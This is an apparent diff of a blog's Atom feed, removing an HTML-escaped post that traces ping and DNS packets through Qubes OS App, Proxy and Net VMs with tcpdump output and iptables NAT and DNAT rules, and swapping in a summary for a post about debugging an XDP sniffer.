-23:56:58.019649 IP 10.137.1.26 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 8.8.8.8: ICMP &lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;request, &lt;span class=&quot;nb&quot;&gt;id &lt;/span&gt;1177, &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;1, length 64
-23:56:58.032636 IP 8.8.8.8 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 10.137.1.26: ICMP &lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;reply, &lt;span class=&quot;nb&quot;&gt;id &lt;/span&gt;1177, &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;1, length 64
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;The source of the request is set to Proxy VM’s &lt;code class=&quot;highlighter-rouge&quot;&gt;eth0&lt;/code&gt; IP, not App VM ones.&lt;/p&gt;
-
-&lt;figure&gt;&lt;figcaption&gt;&lt;span&gt;Ping to 8.8.8.8 from App VM. Notice how the request is forwarded and in
-each &lt;em&gt;hop&lt;/em&gt; the source address is changed (NAT).
-&lt;br /&gt;
-The reply takes the same path but the source address is &lt;strong&gt;not&lt;/strong&gt; changed.&lt;/span&gt;&lt;/figcaption&gt;&lt;img src=&quot;/book-of-gehn/assets/qubes/qubes-full-ping.png&quot; /&gt;&lt;/figure&gt;
-
-&lt;p&gt;This is due a NAT rule that &lt;strong&gt;masquerade&lt;/strong&gt; the routed traffic:&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@proxyvm:# iptables-save &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; nat
-...
-&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; POSTROUTING &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; vif+ &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
-&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; POSTROUTING &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; lo &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
-&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; POSTROUTING &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; MASQUERADE
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;-o vif+&lt;/code&gt; rule prevents masquerade traffic going downward, back to
-the App VM and the &lt;code class=&quot;highlighter-rouge&quot;&gt;-o lo&lt;/code&gt; ignores loopback traffic.&lt;/p&gt;
-
-&lt;p&gt;The rest, including traffic routed to &lt;code class=&quot;highlighter-rouge&quot;&gt;eth0&lt;/code&gt; is masquerade.&lt;/p&gt;
-
-&lt;p&gt;So all Proxy VMs and Net VMs only need to know the IP of the previous
-VM and not the full chain.&lt;/p&gt;
-
-&lt;h2 id=&quot;packet-walk-through&quot;&gt;Packet walk-through&lt;/h2&gt;
-
-&lt;p&gt;&lt;label for=&quot;mf-d5c17f5f4e04f6679ce4e7d841e3fa92&quot; class=&quot;margin-toggle &quot;&gt;⊕&lt;/label&gt;&lt;input type=&quot;checkbox&quot; id=&quot;mf-d5c17f5f4e04f6679ce4e7d841e3fa92&quot; class=&quot;margin-toggle &quot; /&gt;&lt;span class=&quot;marginnote &quot;&gt;&lt;object align=&quot;middle&quot; data=&quot;/book-of-gehn/uml/34cfc84b4ad538d0e44973367f2a764c.svg&quot; type=&quot;image/svg+xml&quot;&gt;&lt;/object&gt;  &lt;br /&gt;&lt;/span&gt;&lt;/p&gt;
-
-&lt;p&gt;App VM does a ping to &lt;code class=&quot;highlighter-rouge&quot;&gt;8.8.8.8&lt;/code&gt;, this is the walk-through&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;App VM
-| pkt:         10.137.7.27 &amp;gt; 8.8.8.8: ICMP echo request
-|
-| route:       default via 10.137.7.1 dev eth0
-| eth0:        10.137.7.27 &amp;gt; 8.8.8.8: ICMP echo request
-
-Proxy VM
-| vif37.0:     10.137.7.27 &amp;gt; 8.8.8.8: ICMP echo request
-| prerouting:  ! -s 10.137.7.27/32 -i vif37.0  =&amp;gt; NO DROP
-| filter:      FORWARD -s 10.137.7.27/32  =&amp;gt; ACCEPT
-|
-| route:       default via 10.137.1.1 dev eth0
-| postrouting: POSTROUTING  =&amp;gt; MASQUERADE
-|
-| eth0:        10.137.1.26 &amp;gt; 8.8.8.8: ICMP echo request
-
---- request is sent to upstream; reply is received moments later ---
-
-Proxy VM
-| eth0:        8.8.8.8 &amp;gt; 10.137.1.26: ICMP echo reply
-| (rev nat):   8.8.8.8 &amp;gt; 10.137.7.27: ICMP echo reply
-| filter:      FORWARD -s 10.137.7.27/32  =&amp;gt; ACCEPT
-|
-| route:       10.137.7.27 dev vif37.0
-| postrouting: POSTROUTING -o vif+  =&amp;gt; DONT MASQUERADE
-|
-| vif37.0:     8.8.8.8 &amp;gt; 10.137.7.27: ICMP echo reply
-
-App VM
-| eth0:          8.8.8.8 &amp;gt; 10.137.7.27: ICMP echo reply
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;dns&quot;&gt;DNS&lt;/h2&gt;
-
-&lt;p&gt;The DNS traffic is handled like the above but with a twist.&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@appvm:# nslookup google.com
-Server:     10.137.7.1
-Address:    10.137.7.1#53
-
-Non-authoritative answer:
-Name:   google.com
-Address: 172.217.172.46
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;It is interesting to note that App VM queried &lt;code class=&quot;highlighter-rouge&quot;&gt;10.137.7.1&lt;/code&gt; to resolve
-the address: the Proxy VM is working as a DNS resolver.&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@appvm:# tcpdump &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0
-...
-23:58:30.214939 IP 10.137.7.27.46734 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 10.137.7.1.53: 26595+ A? google.com. &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;28&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-23:58:30.337391 IP 10.137.7.1.53 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 10.137.7.27.46734: 26595 1/0/0 A 172.217.172.46 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;44&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;hr class=&quot;slender post-layout small&quot; /&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@proxyvm:# tcpdump &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; vif37.0
-...
-23:58:30.220387 IP 10.137.7.27.46734 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 10.137.7.1.53: 26595+ A? google.com. &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;28&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-23:58:30.342664 IP 10.137.7.1.53 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 10.137.7.27.46734: 26595 1/0/0 A 172.217.172.46 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;44&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;But that’s a lie: there is no DNS resolver in Proxy VM and
-the DNS request is forwarded upstream:&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@proxyvm:# tcpdump &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0
-...
-23:58:30.220455 IP 10.137.1.26.46734 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 10.137.1.1.53: 26595+ A? google.com. &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;28&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-23:58:30.342616 IP 10.137.1.1.53 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 10.137.1.26.46734: 26595 1/0/0 A 172.217.172.46 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;44&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Notice how the source address is masqueraded as we saw with the ping packet
-but the &lt;strong&gt;destination address is changed&lt;/strong&gt; too:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;23:58:30.220387 IP 10.137.7.27.46734 &amp;gt; 10.137.7.1.53: 26595+ A? google.com. (28)
-                    NAT  |                   |  DNAT
-                         V                   V
-23:58:30.220455 IP 10.137.1.26.46734 &amp;gt; 10.137.1.1.53: 26595+ A? google.com. (28)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;dnat&quot;&gt;DNAT&lt;/h2&gt;
-
-&lt;p&gt;Nobody is listening on the &lt;code class=&quot;highlighter-rouge&quot;&gt;53 udp&lt;/code&gt; port so the DNAT is applied &lt;em&gt;before&lt;/em&gt; routing.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@proxyvm:# iptables-save -t nat
-...
--A PREROUTING -j PR-QBS
--A PR-QBS -d 10.137.7.1/32 -p udp -m udp --dport 53 -j DNAT --to-destination 10.137.1.1
--A PR-QBS -d 10.137.7.1/32 -p tcp -m tcp --dport 53 -j DNAT --to-destination 10.137.1.1
--A PR-QBS -d 10.137.7.254/32 -p udp -m udp --dport 53 -j DNAT --to-destination 10.137.1.254
--A PR-QBS -d 10.137.7.254/32 -p tcp -m tcp --dport 53 -j DNAT --to-destination 10.137.1.254
-...
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Firewall rules also apply&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@proxyvm:# iptables-save -t filter
-...
--A FORWARD -s 10.137.7.27/32 -d 10.137.1.1/32 -p udp -m udp --dport 53 -j ACCEPT
--A FORWARD -s 10.137.7.27/32 -d 10.137.1.254/32 -p udp -m udp --dport 53 -j ACCEPT
--A FORWARD -s 10.137.7.27/32 -d 10.137.1.1/32 -p tcp -m tcp --dport 53 -j ACCEPT
--A FORWARD -s 10.137.7.27/32 -d 10.137.1.254/32 -p tcp -m tcp --dport 53 -j ACCEPT
-...
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;In the Net VM the destination is replaced by the DNS resolver address
-configured:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@netvm:# iptables-save -t nat
-...
--A PR-QBS -d 10.137.3.1/32 -p udp -m udp --dport 53 -j DNAT --to-destination 8.8.8.8
--A PR-QBS -d 10.137.3.1/32 -p tcp -m tcp --dport 53 -j DNAT --to-destination 8.8.8.8
--A PR-QBS -d 10.137.3.254/32 -p udp -m udp --dport 53 -j DNAT --to-destination 8.8.8.8
--A PR-QBS -d 10.137.3.254/32 -p tcp -m tcp --dport 53 -j DNAT --to-destination 8.8.8.8
-...
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;future-readings&quot;&gt;Future readings&lt;/h2&gt;
-
-&lt;p&gt;About networking and sysadmin:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://lartc.org/howto/&quot;&gt;Linux Advanced Routing &amp;amp; Traffic Control HOWTO&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.qubes-os.org/doc/vpn/&quot;&gt;Qubes OS VPN&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://bugzilla.netfilter.org/show_bug.cgi?id=693&quot;&gt;Netfilter bug&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://www.smythies.com/~doug/network/iptables_notes/&quot;&gt;Iptables notes&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Qubes related:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.qubes-os.org/news/2019/12/25/qsb-056/&quot;&gt;QSB-056&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/QubesOS/qubes-core-agent-linux/pull/209&quot;&gt;PR 209&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/QubesOS/qubes-core-agent-linux/pull/201&quot;&gt;PR 201&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;http://linux-ip.net/linux-ip/&quot;&gt;Linux IP&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.linuxjournal.com/content/linux-advanced-routing-tutorial&quot;&gt;Linux Advanced Routing Tutorial&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://theinvisiblethings.blogspot.com/2011/09/playing-with-qubes-networking-for-fun.html&quot;&gt;Playing with Qubes networking for fun&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>Gehn</name></author><summary type="html">Qubes OS has an interesting network system to isolate more-or-less trusted application virtual machines (App) from absolute untrusted network VMs (Net). ⊕ These last ones have the drivers required to handle ethernet and wifi cards which expose them to a potentially deathly bug lurking in the drivers. An additional VM is put in the middle between App VMs and Net VMs. This absolute trusted proxy VM serves as a safe firewall (Proxy). In this post will explore how these VMs connect and how the packets are forwarded up and down along this chain of VMs.</summary></entry></feed>
+&lt;/ul&gt;</content><author><name>Gehn</name></author><summary type="html">⊕ Picture this: you’d been developing for six months a network sniffer using XDP, a kernel in-pass in Linux. Six months and when you are about to release it, you find not one but three bugs that shake all your understanding of XDP. A debugging race against the clock begins.</summary></entry></feed>
